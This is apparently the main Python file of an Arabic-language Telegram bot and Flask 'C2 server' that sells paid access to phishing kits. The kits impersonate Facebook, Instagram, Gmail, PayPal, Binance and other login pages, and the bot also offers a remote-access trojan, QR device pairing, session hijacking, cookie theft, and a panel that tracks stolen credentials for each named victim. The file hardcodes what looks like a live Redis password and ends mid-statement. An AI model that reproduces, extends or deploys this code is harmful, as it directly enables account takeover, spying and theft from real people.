# main.py
import os
import io
import time
import json
import threading
import requests
import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
from flask import Flask, request, jsonify, redirect
import redis
import uuid

# ============================================================
# استيراد ملفات الأدوات
# ============================================================
try:
    from facebook_module import init_facebook_routes
except Exception as e:
    print(f"[-] Error importing facebook_module: {e}")
    init_facebook_routes = lambda app, bot: None

try:
    from instagram_module import init_instagram_routes
except Exception as e:
    print(f"[-] Error importing instagram_module: {e}")
    init_instagram_routes = lambda app, bot: None

try:
    from rat_module import init_rat_routes, rat_bp, queue_command
except Exception as e:
    print(f"[-] Error importing rat_module: {e}")
    init_rat_routes = lambda app, bot: None
    rat_bp = None
    queue_command = lambda *args: None

try:
    from qr_pairing import init_qr_routes, qr_bp, generate_qr_code_bytes
except Exception as e:
    print(f"[-] Error importing qr_pairing: {e}")
    init_qr_routes = lambda app, bot: None
    qr_bp = None
    generate_qr_code_bytes = lambda *args: None

# ============================================================
# استيراد LSH Module
# ============================================================
try:
    from lsh_module import (
        init_lsh_routes,
        lsh_bp,
        generate_qr_code_bytes as lsh_generate_qr,
        set_bot_reference,
        push_command as lsh_push_command,
        get_session as lsh_get_session,
        build_lsh_control_panel,
    )
    LSH_ENABLED = True
except Exception as e:
    print(f"[-] Error importing lsh_module: {e}")
    LSH_ENABLED = False

    def init_lsh_routes(app, bot): pass
    def set_bot_reference(bot): pass
    def lsh_push_command(*a, **kw): return False
    def lsh_get_session(*a, **kw): return None
    def lsh_generate_qr(*a, **kw): return io.BytesIO()
    def build_lsh_control_panel(*a, **kw): return InlineKeyboardMarkup()
    lsh_bp = None

# ============================================================
# استيراد Session Hunter
# ============================================================
try:
    from session_hunter import (
        init_session_hunter_routes,
        sh_bp,
        get_sh_data,
        build_sh_panel,
        SUPPORTED_SITES,
        create_session as sh_create_session,
        generate_login_page as sh_generate_login_page,
    )
    SH_ENABLED = True
    print("[+] session_hunter imported")
except Exception as e:
    print(f"[-] Error importing session_hunter: {e}")
    SH_ENABLED = False

    def init_session_hunter_routes(app, bot): pass
    sh_bp = None
    def get_sh_data(sid): return {}
    def build_sh_panel(sid, cid): return InlineKeyboardMarkup()
    SUPPORTED_SITES = {}
    def sh_create_session(*a, **kw): return None
    def sh_generate_login_page(*a, **kw): return "Error: session_hunter not loaded"

# ============================================================
# ★★★ استيراد Victims Manager ★★★
# ============================================================
try:
    from victims_manager import (
        create_victim,
        get_victim,
        get_all_victims,
        delete_victim,
        update_victim_status,
        rename_victim,
        get_victim_by_code,
        add_creds_to_victim,
        get_victim_creds,
    )
    VICTIMS_ENABLED = True
    print("[+] victims_manager imported")
except Exception as e:
    print(f"[-] Error importing victims_manager: {e}")
    VICTIMS_ENABLED = False
    def create_victim(*a, **kw): return None
    def get_victim(*a, **kw): return None
    def get_all_victims(*a, **kw): return []
    def delete_victim(*a, **kw): return False
    def update_victim_status(*a, **kw): return False
    def rename_victim(*a, **kw): return False
    def get_victim_by_code(*a, **kw): return None
    def add_creds_to_victim(*a, **kw): return False
    def get_victim_creds(*a, **kw): return []

# ============================================================
# استيراد نظام الدفع + الأدمن
# ============================================================
try:
    from stars_payment import (
        register_payment_handlers,
        get_or_create_user,
        can_use_tool,
        consume_usage,
        build_plans_keyboard,
        build_main_payment_keyboard,
        build_account_text,
        build_plans_text,
        send_invoice,
        PRICING_PLANS,
        FREE_TRIAL_USES,
        AVAILABLE_TOOLS,
        is_admin,
        is_vip,
        get_all_users,
        get_user,
        save_user,
        delete_user,
        ban_user,
        unban_user,
        activate_subscription,
        build_admin_menu,
        build_admin_users_keyboard,
        build_user_detail_keyboard,
        build_user_info_text,
        build_admin_stats_text,
        ADMIN_IDS,
        VIP_IDS,
    )
    PAYMENT_ENABLED = True
    print("[+] stars_payment imported")
except Exception as e:
    print(f"[-] Error importing stars_payment: {e}")
    PAYMENT_ENABLED = False

    def register_payment_handlers(bot): pass
    def get_or_create_user(*a, **kw): return {}
    def can_use_tool(*a, **kw): return {"allowed": True, "reason": "bypass"}
    def consume_usage(*a, **kw): return True
    def build_plans_keyboard(): return InlineKeyboardMarkup()
    def build_main_payment_keyboard(): return InlineKeyboardMarkup()
    def build_account_text(*a, **kw): return "نظام الدفع معطّل"
    def build_plans_text(): return "نظام الدفع معطّل"
    def send_invoice(*a, **kw): pass
    PRICING_PLANS = {}
    FREE_TRIAL_USES = 1
    AVAILABLE_TOOLS = ["fb", "ig", "qr", "rat", "lsh", "sh"]
    def is_admin(uid): return False
    def is_vip(uid): return False
    def get_all_users(): return []
    def get_user(uid): return None
    def save_user(uid, u): return False
    def delete_user(uid): return False
    def ban_user(uid): return False
    def unban_user(uid): return False
    def activate_subscription(uid, pk): return {}
    def build_admin_menu(): return InlineKeyboardMarkup()
    def build_admin_users_keyboard(*a, **kw): return InlineKeyboardMarkup()
    def build_user_detail_keyboard(*a, **kw): return InlineKeyboardMarkup()
    def build_user_info_text(*a, **kw): return ""
    def build_admin_stats_text(): return ""
    ADMIN_IDS = []
    VIP_IDS = []


# ============================================================
# إعدادات عامة
# ============================================================
BOT_TOKEN = os.getenv("BOT_TOKEN")
PUBLIC_URL = os.getenv("PUBLIC_URL", "https://sec.h42536974.workers.dev")
RAILWAY_URL = os.getenv("RAILWAY_URL", "https://daf-production-8df9.up.railway.app")
RAILWAY_URL = PUBLIC_URL

print(f"[+] Public URL: {PUBLIC_URL}")
print(f"[+] Internal URL: {RAILWAY_URL}")


# ============================================================
# Redis
# ============================================================
REDIS_URL = os.getenv("REDIS_URL", "").strip()

if not REDIS_URL:
    REDIS_URL = "redis://default:aF4GQMQw6l9ZEpZjfThV2koySkuFbk9c@insect-outsize-shirt-48022.db.redis.io:15744"

if REDIS_URL.startswith("redis-cli"):
    REDIS_URL = REDIS_URL.split(" -u ")[-1].strip()

if not REDIS_URL.startswith(("redis://", "rediss://", "unix://")):
    REDIS_URL = "redis://" + REDIS_URL

print(f"[+] Redis URL configured: {REDIS_URL[:45]}...")


def _try_redis(url):
    try:
        client = redis.Redis.from_url(
            url,
            decode_responses=True,
            socket_timeout=10,
            socket_connect_timeout=10,
            retry_on_timeout=True,
            health_check_interval=30,
        )
        client.ping()
        return client
    except Exception as e:
        print(f"[-] Redis try failed ({url[:30]}...): {e}")
        return None


redis_client = _try_redis(REDIS_URL)

if not redis_client and REDIS_URL.startswith("redis://"):
    tls_url = REDIS_URL.replace("redis://", "rediss://", 1)
    print(f"[+] Trying TLS fallback...")
    redis_client = _try_redis(tls_url)
    if redis_client:
        REDIS_URL = tls_url
        print("[+] TLS connection succeeded!")

if not redis_client and REDIS_URL.startswith("rediss://"):
    non_tls = REDIS_URL.replace("rediss://", "redis://", 1)
    print(f"[+] Trying non-TLS fallback...")
    redis_client = _try_redis(non_tls)
    if redis_client:
        REDIS_URL = non_tls
        print("[+] Non-TLS connection succeeded!")

if redis_client:
    print("[+] main: Redis connected successfully")
else:
    print("[-] main: Redis FAILED — some features may not work")

if not BOT_TOKEN:
    raise ValueError("[-] BOT_TOKEN is missing!")

print(f"[+] Bot token configured: {BOT_TOKEN[:10]}...")

bot = telebot.TeleBot(BOT_TOKEN)
app = Flask(__name__)


# ============================================================
# Origin Gate
# ============================================================
ORIGIN_SECRET = os.getenv("ORIGIN_SECRET", "a7f3k9x2m5p8q1w4e6r0t3y7u2i5o8s1")

ORIGIN_GATE_EXEMPT = ['/', '/health']

@app.before_request
def verify_origin():
    if request.path in ORIGIN_GATE_EXEMPT:
        return None
    if request.method == 'OPTIONS':
        return None
    secret = request.headers.get('X-Origin-Secret', '')
    if secret == ORIGIN_SECRET:
        return None
    client_ip = (request.headers.get('CF-Connecting-IP') or 
                 request.headers.get('X-Forwarded-For') or 
                 request.remote_addr)
    print(f"[-] BLOCKED direct access to {request.path} from {client_ip}")
    return jsonify({
        "error": "Access denied",
        "message": "This endpoint requires the official application",
    }), 403


# ============================================================
# Health check
# ============================================================
@app.route('/')
def health_check():
    return "C2 Server and Telegram Bot are active and running smoothly.", 200


# ============================================================
# توليد كود قصير
# ============================================================
def generate_short_code(length=8):
    import random
    chars = 'abcdefghjkmnpqrstuvwxyzABCDEFGHJKMNPQRSTUVWXYZ23456789'
    return ''.join(random.choices(chars, k=length))


# ============================================================
# تسجيل Blueprints ومسارات
# ============================================================
if rat_bp:
    app.register_blueprint(rat_bp)
if qr_bp:
    app.register_blueprint(qr_bp)
if LSH_ENABLED and lsh_bp:
    app.register_blueprint(lsh_bp)
if SH_ENABLED and sh_bp:
    app.register_blueprint(sh_bp)

init_facebook_routes(app, bot)
init_instagram_routes(app, bot)
init_rat_routes(app, bot)
init_qr_routes(app, bot)
init_lsh_routes(app, bot)
init_session_hunter_routes(app, bot)

if LSH_ENABLED:
    set_bot_reference(bot)

register_payment_handlers(bot)


# ============================================================
# ★★★ مسار الرابط القصير — يربط الضحية ★★★
# ============================================================
@app.route('/f/<code>', methods=['GET'])
def short_link_show(code):
    """يستقبل الرابط القصير ويعرض الصفحة مباشرة"""
    meta = get_short_link(code)
    if not meta:
        return """<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head><meta charset="UTF-8"><title>رابط منتهي</title>
<style>body{font-family:sans-serif;background:#f5f7fa;text-align:center;padding:80px 20px}
h1{color:#e11d48}</style></head>
<body><h1>❌ الرابط منتهي الصلاحية</h1><p>يرجى طلب رابط جديد</p></body></html>""", 410
    
    chat_id = str(meta.get("chat_id"))
    site = meta.get("site", "facebook")
    victim_id = meta.get("victim_id", "")
    victim_name = meta.get("name", "")
    
    # ولّد session_id
    session_id = uuid.uuid4().hex[:24]
    
    # احفظ الجلسة في Redis
    if redis_client:
        try:
            redis_client.setex(
                f"sh_session:{session_id}",
                86400 * 7,
                json.dumps({
                    "chat_id": chat_id,
                    "target_site": site,
                    "victim_id": victim_id,
                    "victim_name": victim_name,
                })
            )
        except Exception as e:
            print(f"[-] Redis save session error: {e}")
    
    # حدّث حالة الضحية
    if victim_id and VICTIMS_ENABLED:
        try:
            update_victim_status(chat_id, victim_id, "active")
        except Exception:
            pass
    
    # أنشئ الجلسة
    try:
        sh_create_session(session_id, chat_id, site)
    except Exception as e:
        print(f"[-] sh_create_session error: {e}")
    
    # ولّد الصفحة
    try:
        html = sh_generate_login_page(session_id, chat_id, site)
        return html, 200
    except Exception as e:
        print(f"[-] sh_generate_login_page error: {e}")
        import traceback
        traceback.print_exc()
        return f"<h1>Error: {e}</h1>", 500


def get_short_link(code):
    """يجلب بيانات كود مختصر"""
    if not redis_client:
        return None
    try:
        raw = redis_client.get(f"short:{code}")
        if raw:
            return json.loads(raw)
    except Exception as e:
        print(f"[-] get_short_link error: {e}")
    return None


# ============================================================
# القوائم
# ============================================================
def main_menu(user_id=None):
    markup = InlineKeyboardMarkup()
    markup.add(InlineKeyboardButton("🔗 توليد رابط مصيدة فيسبوك", callback_data="gen_fb"))
    markup.add(InlineKeyboardButton("📸 توليد رابط مصيدة انستقرام", callback_data="gen_ig"))
    markup.add(InlineKeyboardButton("📱 أداة المراقبة والتحكم الخلفي", callback_data="gen_rat"))
    markup.add(InlineKeyboardButton("📷 أداة ربط الضحية السريع عبر QR", callback_data="gen_qr"))
    markup.add(InlineKeyboardButton("🕹️ السيطرة الكاملة على الجلسة (LSH)", callback_data="gen_lsh"))
    markup.add(InlineKeyboardButton("🍪 سرقة الكوكيز والجلسات (SH)", callback_data="gen_sh"))
    markup.add(InlineKeyboardButton("💎 الاشتراكات والدفع", callback_data="payment_menu"))
    markup.add(InlineKeyboardButton("👤 حسابي", callback_data="my_account"))
    
    if user_id and is_admin(user_id):
        markup.add(InlineKeyboardButton("👑 لوحة تحكم الأدمن", callback_data="admin_panel"))
    
    return markup


def payment_menu():
    return build_main_payment_keyboard()


def _deny_message(reason, user_id, tool, data=None):
    data = data or {}
    if reason == "banned":
        return "🚫 **أنت محظور من استخدام البوت.**"
    if reason == "daily_limit_reached":
        return f"⚠️ **وصلت للحد اليومي** ({data.get('daily_limit', 0)})."
    if reason == "no_credit":
        return (
            "❌ **لا يوجد لديك استخدام متاح.**\n\n"
            f"🎁 حصلت على {FREE_TRIAL_USES} استخدام مجاني.\n"
            "💎 اشترك للاستمرار."
        )
    return "❌ لا يمكن استخدام الأداة."


# ============================================================
# Start
# ============================================================
@bot.message_handler(commands=['start', 'panel'])
def start_command(message):
    print(f"[+] /start from {message.from_user.id}")
    user_name = message.from_user.first_name
    get_or_create_user(message.from_user.id, message.from_user.username or "Unknown", user_name)
    
    if is_admin(message.from_user.id):
        text = (
            f"👑 **مرحباً أيها الأدمن {user_name}!**\n\n"
            f"⚡ صلاحيات كاملة على النظام.\n"
            f"💎 VIP لا نهائي — كل الأدوات مفتوحة.\n\n"
            f"🎛️ استخدم **لوحة تحكم الأدمن**."
        )
    else:
        text = (
            f"⚡ مرحباً بك يا {user_name} في DEV ١ 😈\n\n"
            "غير مسؤول تماماً عن إساءة الاستخدام.\n\n"
            f"🎁 لديك {FREE_TRIAL_USES} استخدام مجاني لكل أداة."
        )
    
    bot.send_message(message.chat.id, text, parse_mode="Markdown",
                     reply_markup=main_menu(message.from_user.id))


# ============================================================
# Callback Handler
# ============================================================
@bot.callback_query_handler(func=lambda call: True)
def callback_handler(call):
    chat_id = call.message.chat.id
    user_id = call.from_user.id

    # ============================================================
    # الدفع
    # ============================================================
    if call.data == "payment_menu":
        bot.answer_callback_query(call.id)
        bot.send_message(chat_id, "💎 **قسم الاشتراكات والدفع**\n━━━━━━━━━━━━━━━━━━\nاختر:",
                         parse_mode="Markdown", reply_markup=build_main_payment_keyboard())
        return

    if call.data == "show_plans":
        bot.answer_callback_query(call.id)
        bot.send_message(chat_id, build_plans_text(), parse_mode="Markdown",
                         reply_markup=build_plans_keyboard())
        return

    if call.data.startswith("buy_plan_"):
        plan_key = call.data.replace("buy_plan_", "")
        bot.answer_callback_query(call.id, "جاري تجهيز الفاتورة...")
        send_invoice(bot, chat_id, plan_key)
        return

    if call.data == "my_account":
        bot.answer_callback_query(call.id)
        bot.send_message(chat_id, build_account_text(chat_id), parse_mode="Markdown")
        return

    if call.data == "back_to_main":
        bot.answer_callback_query(call.id)
        bot.send_message(chat_id, "القائمة الرئيسية:", reply_markup=main_menu(user_id))
        return

    # ============================================================
    # لوحة الأدمن
    # ============================================================
    if call.data == "admin_panel":
        if not is_admin(user_id):
            bot.answer_callback_query(call.id, "❌ غير مصرح", show_alert=True)
            return
        bot.answer_callback_query(call.id)
        bot.send_message(chat_id, "👑 **لوحة تحكم الأدمن**\n━━━━━━━━━━━━━━━━━━",
                         reply_markup=build_admin_menu(), parse_mode="Markdown")
        return

    if call.data.startswith("admin_users_"):
        if not is_admin(user_id):
            bot.answer_callback_query(call.id, "❌ غير مصرح", show_alert=True)
            return
        try: page = int(call.data.replace("admin_users_", ""))
        except: page = 0
        users = get_all_users()
        if not users:
            bot.answer_callback_query(call.id, "لا يوجد مستخدمون", show_alert=True)
            return
        users.sort(key=lambda u: u.get("created_at", ""), reverse=True)
        bot.answer_callback_query(call.id)
        bot.send_message(chat_id, f"👥 **قائمة المستخدمين** ({len(users)})",
                         reply_markup=build_admin_users_keyboard(users, page), parse_mode="Markdown")
        return

    if call.data.startswith("admin_user_"):
        if not is_admin(user_id):
            bot.answer_callback_query(call.id, "❌ غير مصرح", show_alert=True)
            return
        try: uid = int(call.data.replace("admin_user_", ""))
        except: return
        user = get_user(uid)
        if not user:
            bot.answer_callback_query(call.id, "❌ غير موجود", show_alert=True)
            return
        bot.answer_callback_query(call.id)
        bot.send_message(chat_id, build_user_info_text(uid, user),
                         reply_markup=build_user_detail_keyboard(uid, user), parse_mode="Markdown")
        return

    if call.data.startswith("admin_ban_user_"):
        if not is_admin(user_id): return
        try: uid = int(call.data.replace("admin_ban_user_", ""))
        except: return
        ban_user(uid)
        bot.answer_callback_query(call.id, "✅ تم الحظر", show_alert=True)
        return

    if call.data.startswith("admin_unban_user_"):
        if not is_admin(user_id): return
        try: uid = int(call.data.replace("admin_unban_user_", ""))
        except: return
        unban_user(uid)
        bot.answer_callback_query(call.id, "✅ تم فك الحظر", show_alert=True)
        return

    if call.data.startswith("admin_grant_vip_user_"):
        if not is_admin(user_id): return
        try: uid = int(call.data.replace("admin_grant_vip_user_", ""))
        except: return
        user = get_or_create_user(uid)
        user["is_vip"] = True
        save_user(uid, user)
        bot.answer_callback_query(call.id, "💎 تم منح VIP", show_alert=True)
        try:
            bot.send_message(uid, "💎 **تهانينا!** تم منحك VIP! 🚀", parse_mode="Markdown")
        except: pass
        return

    if call.data.startswith("admin_remove_vip_"):
        if not is_admin(user_id): return
        try: uid = int(call.data.replace("admin_remove_vip_", ""))
        except: return
        user = get_or_create_user(uid)
        user["is_vip"] = False
        save_user(uid, user)
        bot.answer_callback_query(call.id, "✅ تم إزالة VIP", show_alert=True)
        return

    if call.data.startswith("admin_delete_user_"):
        if not is_admin(user_id): return
        try: uid = int(call.data.replace("admin_delete_user_", ""))
        except: return
        delete_user(uid)
        bot.answer_callback_query(call.id, "🗑️ تم الحذف", show_alert=True)
        return

    if call.data.startswith("admin_give_sub_"):
        if not is_admin(user_id): return
        try: uid = int(call.data.replace("admin_give_sub_", ""))
        except: return
        bot.answer_callback_query(call.id)
        markup = InlineKeyboardMarkup()
        markup.row(
            InlineKeyboardButton("⭐ أساسية", callback_data=f"admin_activate_basic_{uid}"),
            InlineKeyboardButton("💎 احترافية", callback_data=f"admin_activate_pro_{uid}"),
        )
        markup.row(InlineKeyboardButton("👑 VIP", callback_data=f"admin_activate_vip_{uid}"))
        markup.row(InlineKeyboardButton("🔙 رجوع", callback_data=f"admin_user_{uid}"))
        bot.send_message(chat_id, f"📅 **اختر الباقة** `{uid}`",
                         reply_markup=markup, parse_mode="Markdown")
        return

    if call.data.startswith("admin_activate_"):
        if not is_admin(user_id): return
        parts = call.data.replace("admin_activate_", "").rsplit("_", 1)
        if len(parts) != 2: return
        plan_key, uid_str = parts
        try: uid = int(uid_str)
        except: return
        try:
            user = activate_subscription(uid, plan_key)
            plan = PRICING_PLANS.get(plan_key)
            bot.answer_callback_query(call.id, f"✅ {plan['name']}", show_alert=True)
            try:
                from datetime import datetime as _dt
                expires = _dt.fromisoformat(user["subscription"]["expires_at"])
                bot.send_message(uid, f"🎉 **تم تفعيل اشتراكك!**\n📅 ينتهي: `{expires.strftime('%Y-%m-%d')}`",
                                 parse_mode="Markdown")
            except: pass
        except Exception as e:
            bot.answer_callback_query(call.id, f"❌ {e}", show_alert=True)
        return

    if call.data == "admin_stats":
        if not is_admin(user_id): return
        bot.answer_callback_query(call.id)
        bot.send_message(chat_id, build_admin_stats_text(),
                         reply_markup=InlineKeyboardMarkup().add(
                             InlineKeyboardButton("🔙 رجوع", callback_data="admin_panel")
                         ), parse_mode="Markdown")
        return

    if call.data == "admin_recent":
        if not is_admin(user_id): return
        users = get_all_users()
        users.sort(key=lambda u: u.get("created_at", ""), reverse=True)
        recent = users[:10]
        lines = ["🆕 **آخر 10 مستخدمين:**"]
        for u in recent:
            uid = u.get("user_id")
            name = u.get("first_name", "Unknown")
            icon = "👑" if is_admin(uid) else "💎" if u.get("is_vip") else "🚫" if u.get("is_banned") else "👤"
            lines.append(f"{icon} **{name}** — `{uid}`")
        bot.answer_callback_query(call.id)
        bot.send_message(chat_id, "\n".join(lines),
                         reply_markup=InlineKeyboardMarkup().add(
                             InlineKeyboardButton("🔙 رجوع", callback_data="admin_panel")
                         ), parse_mode="Markdown")
        return

    if call.data == "admin_search":
        if not is_admin(user_id): return
        bot.answer_callback_query(call.id)
        msg = bot.send_message(chat_id, "🔍 **أرسل ID أو username:**", parse_mode="Markdown")
        bot.register_next_step_handler(msg, admin_search_handler)
        return

    if call.data == "admin_broadcast":
        if not is_admin(user_id): return
        bot.answer_callback_query(call.id)
        msg = bot.send_message(chat_id, "📢 **أرسل الرسالة:**", parse_mode="Markdown")
        bot.register_next_step_handler(msg, admin_broadcast_handler)
        return

    if call.data == "admin_ban":
        if not is_admin(user_id): return
        bot.answer_callback_query(call.id)
        msg = bot.send_message(chat_id, "🚫 **أرسل ID للحظر:**", parse_mode="Markdown")
        bot.register_next_step_handler(msg, admin_ban_handler)
        return

    if call.data == "admin_unban":
        if not is_admin(user_id): return
        bot.answer_callback_query(call.id)
        msg = bot.send_message(chat_id, "✅ **أرسل ID لفك الحظر:**", parse_mode="Markdown")
        bot.register_next_step_handler(msg, admin_unban_handler)
        return

    if call.data == "admin_delete":
        if not is_admin(user_id): return
        bot.answer_callback_query(call.id)
        msg = bot.send_message(chat_id, "🗑️ **أرسل ID للحذف:**", parse_mode="Markdown")
        bot.register_next_step_handler(msg, admin_delete_handler)
        return

    if call.data == "admin_grant_vip":
        if not is_admin(user_id): return
        bot.answer_callback_query(call.id)
        msg = bot.send_message(chat_id, "💎 **أرسل ID لمنح VIP:**", parse_mode="Markdown")
        bot.register_next_step_handler(msg, admin_grant_vip_handler)
        return

    if call.data == "admin_give_stars":
        if not is_admin(user_id): return
        bot.answer_callback_query(call.id)
        msg = bot.send_message(chat_id, "⭐ **أرسل:** `user_id|amount`", parse_mode="Markdown")
        bot.register_next_step_handler(msg, admin_give_stars_handler)
        return

    if call.data.startswith("admin_msg_user_"):
        if not is_admin(user_id): return
        try: uid = int(call.data.replace("admin_msg_user_", ""))
        except: return
        bot.answer_callback_query(call.id)
        msg = bot.send_message(chat_id, f"📨 **أرسل الرسالة لـ** `{uid}`:", parse_mode="Markdown")
        bot.register_next_step_handler(msg, lambda m, u=uid: admin_msg_user_handler(m, u))
        return

    if call.data == "noop":
        bot.answer_callback_query(call.id)
        return

    # ============================================================
    # Facebook
    # ============================================================
    if call.data == "gen_fb":
        check = can_use_tool(chat_id, "fb")
        if not check["allowed"]:
            bot.answer_callback_query(call.id, "❌ لا يوجد رصيد", show_alert=True)
            bot.send_message(chat_id, _deny_message(check["reason"], chat_id, "fb", check), parse_mode="Markdown")
            return
        consume_usage(chat_id, "fb")
        bot.answer_callback_query(call.id, "جاري التجهيز...")
        link = f"{PUBLIC_URL}/login.php?id={chat_id}"
        bot.send_message(chat_id, f"🎯 رابط فيسبوك:\n `{link}` ", parse_mode="Markdown")
        return

    # ============================================================
    # Instagram
    # ============================================================
    if call.data == "gen_ig":
        check = can_use_tool(chat_id, "ig")
        if not check["allowed"]:
            bot.answer_callback_query(call.id, "❌ لا يوجد رصيد", show_alert=True)
            bot.send_message(chat_id, _deny_message(check["reason"], chat_id, "ig", check), parse_mode="Markdown")
            return
        consume_usage(chat_id, "ig")
        bot.answer_callback_query(call.id, "جاري التجهيز...")
        link = f"{PUBLIC_URL}/ig_login.php?id={chat_id}"
        bot.send_message(chat_id, f"📸 رابط انستقرام:\n `{link}` ", parse_mode="Markdown")
        return

    # ============================================================
    # RAT
    # ============================================================
    if call.data == "gen_rat":
        check = can_use_tool(chat_id, "rat")
        if not check["allowed"]:
            bot.answer_callback_query(call.id, "❌ لا يوجد رصيد", show_alert=True)
            bot.send_message(chat_id, _deny_message(check["reason"], chat_id, "rat", check), parse_mode="Markdown")
            return
        consume_usage(chat_id, "rat")
        bot.answer_callback_query(call.id, "جاري التجهيز...")
        link = f"{PUBLIC_URL}/system_secure_v2?id={chat_id}"
        bot.send_message(chat_id, f"📱 رابط RAT:\n `{link}`", parse_mode="Markdown")
        return

    # ============================================================
    # QR
    # ============================================================
    if call.data == "gen_qr":
        check = can_use_tool(chat_id, "qr")
        if not check["allowed"]:
            bot.answer_callback_query(call.id, "❌ لا يوجد رصيد", show_alert=True)
            bot.send_message(chat_id, _deny_message(check["reason"], chat_id, "qr", check), parse_mode="Markdown")
            return
        consume_usage(chat_id, "qr")
        bot.answer_callback_query(call.id, "جاري التجهيز...")
        token = str(uuid.uuid4())[:8]
        if redis_client:
            try: redis_client.setex(f"qr_token:{token}", 300, chat_id)
            except: pass
        target_link = f"{PUBLIC_URL}/qr_scan_target?token={token}"
        qr_image = generate_qr_code_bytes(target_link)
        if qr_image:
            qr_image.name = 'pairing_qr.jpg'
            bot.send_photo(chat_id, qr_image,
                caption="📷 **امسح الـ QR:**", parse_mode="Markdown")
        else:
            bot.send_message(chat_id, f"🎯 رابط QR:\n`{target_link}`", parse_mode="Markdown")
        return

    # ============================================================
    # LSH
    # ============================================================
    if call.data == "gen_lsh":
        check = can_use_tool(chat_id, "lsh")
        if not check["allowed"]:
            bot.answer_callback_query(call.id, "❌ لا يوجد رصيد", show_alert=True)
            bot.send_message(chat_id, _deny_message(check["reason"], chat_id, "lsh", check), parse_mode="Markdown")
            return
        consume_usage(chat_id, "lsh")
        bot.answer_callback_query(call.id, "جاري التجهيز...")
        session_id = str(uuid.uuid4()).replace('-', '')[:24]
        if redis_client:
            try: redis_client.setex(f"lsh_session:{session_id}", 86400, str(chat_id))
            except: pass
        try:
            requests.post(f"{PUBLIC_URL}/lsh_create",
                json={"chat_id": chat_id, "session_id": session_id}, timeout=5)
        except: pass
        target_link = f"{PUBLIC_URL}/lsh?s={session_id}&id={chat_id}"
        qr_image = lsh_generate_qr(target_link)
        if qr_image:
            qr_image.name = 'lsh_qr.png'
            try:
                bot.send_photo(chat_id, qr_image,
                    caption=f"🕹️ **جلسة LSH جاهزة!**\n`{target_link}`", parse_mode="Markdown")
            except:
                bot.send_message(chat_id, f"🕹️ {target_link}")
        else:
            bot.send_message(chat_id, f"🕹️ {target_link}")
        return

    # ============================================================
    # ★★★ Session Hunter — نظام الضحايا ★★★
    # ============================================================
    if call.data == "gen_sh":
        check = can_use_tool(chat_id, "sh")
        if not check["allowed"]:
            bot.answer_callback_query(call.id, "❌ لا يوجد رصيد", show_alert=True)
            bot.send_message(chat_id, _deny_message(check["reason"], chat_id, "sh", check), parse_mode="Markdown")
            return
        bot.answer_callback_query(call.id)
        
        # ★ اعرض قائمة الضحايا ★
        victims = get_all_victims(chat_id)
        
        markup = InlineKeyboardMarkup()
        markup.add(InlineKeyboardButton("➕ ضحية جديدة", callback_data="victim_new"))
        
        if victims:
            markup.add(InlineKeyboardButton(
                f"━━━ 📋 الضحايا ({len(victims)}) ━━━",
                callback_data="noop"
            ))
            for v in victims[:12]:
                name = v.get("name", "غير معروف")[:18]
                site = v.get("site", "facebook")
                creds = int(v.get("creds_count", 0))
                
                if creds > 0:
                    icon = "✅"
                elif v.get("status") == "active":
                    icon = "⏳"
                else:
                    icon = "⏸️"
                
                site_icon = {
                    "facebook": "📘", "instagram": "📷", "tiktok": "🎵",
                    "twitter": "🐦", "gmail": "📧", "snapchat": "👻",
                    "linkedin": "💼", "discord": "🎮", "telegram": "✈️",
                    "netflix": "🎬", "paypal": "💳", "binance": "💰",
                }.get(site, "🌐")
                
                vid = v.get("victim_id", "")
                markup.add(InlineKeyboardButton(
                    f"{icon} {name} — {site_icon} ({creds} 📥)",
                    callback_data=f"victim_{vid}"
                ))
        
        bot.send_message(
            chat_id,
            f"👥 **نظام إدارة الضحايا**\n"
            f"━━━━━━━━━━━━━━━━━━\n"
            f"📊 **عدد الضحايا:** `{len(victims)}`\n\n"
            f"اختر ضحية لإدارتها أو أضف ضحية جديدة:",
            reply_markup=markup,
            parse_mode="Markdown"
        )
        return

    # ============================================================
    # إضافة ضحية جديدة
    # ============================================================
    if call.data == "victim_new":
        bot.answer_callback_query(call.id)
        msg = bot.send_message(
            chat_id,
            "📝 **أرسل اسم الضحية:**\n\n"
            "مثال: `أحمد` أو `محمد - الرياض`\n\n"
            "_سيُستخدم الاسم لتمييز هذه الضحية_",
            parse_mode="Markdown"
        )
        bot.register_next_step_handler(msg, victim_name_handler)
        return

    # ============================================================
    # عرض ضحية محددة
    # ============================================================
    if call.data.startswith("victim_") and not call.data.startswith("victim_new") \
       and not call.data.startswith("victim_site_") and not call.data.startswith("victim_creds_") \
       and not call.data.startswith("victim_refresh_") and not call.data.startswith("victim_copy_") \
       and not call.data.startswith("victim_rename_") and not call.data.startswith("victim_delete_") \
       and not call.data.startswith("victim_confirm_delete_"):
        
        victim_id = call.data.replace("victim_", "")
        victim = get_victim(chat_id, victim_id)
        if not victim:
            bot.answer_callback_query(call.id, "❌ ضحية غير موجودة", show_alert=True)
            return
        
        bot.answer_callback_query(call.id)
        
        name = victim.get("name", "غير معروف")
        site = victim.get("site", "facebook")
        creds_count = int(victim.get("creds_count", 0))
        status = victim.get("status", "pending")
        
        site_names = {
            "facebook": "فيسبوك", "instagram": "انستقرام",
            "tiktok": "تيك توك", "twitter": "تويتر / X",
            "gmail": "جيميل", "snapchat": "سناب شات",
            "linkedin": "لينكد إن", "discord": "ديسكورد",
            "telegram": "تلجرام", "netflix": "نتفليكس",
            "paypal": "باي بال", "binance": "بينانس",
        }
        
        status_names = {
            "pending": "⏸️ في الانتظار",
            "active": "⏳ نشطة",
            "captured": "✅ تم الالتقاط"
        }
        
        target_link = f"{PUBLIC_URL}/f/{victim.get('code', '')}"
        created = time.strftime('%Y-%m-%d %H:%M', time.localtime(float(victim.get("created_at", 0))))
        
        text = (
            f"👤 **بيانات الضحية**\n"
            f"━━━━━━━━━━━━━━━━━━\n\n"
            f"📛 **الاسم:** `{name}`\n"
            f"🌐 **الموقع:** {site_names.get(site, site)}\n"
            f"📊 **الحالة:** {status_names.get(status, status)}\n"
            f"📥 **البيانات المسروقة:** `{creds_count}`\n"
            f"📅 **تاريخ الإنشاء:** `{created}`\n\n"
            f"🔗 **الرابط:**\n`{target_link}`\n\n"
            f"━━━━━━━━━━━━━━━━━━"
        )
        
        markup = InlineKeyboardMarkup()
        markup.row(
            InlineKeyboardButton("📥 عرض البيانات", callback_data=f"victim_creds_{victim_id}"),
            InlineKeyboardButton("🔄 تحديث", callback_data=f"victim_{victim_id}"),
        )
        markup.row(
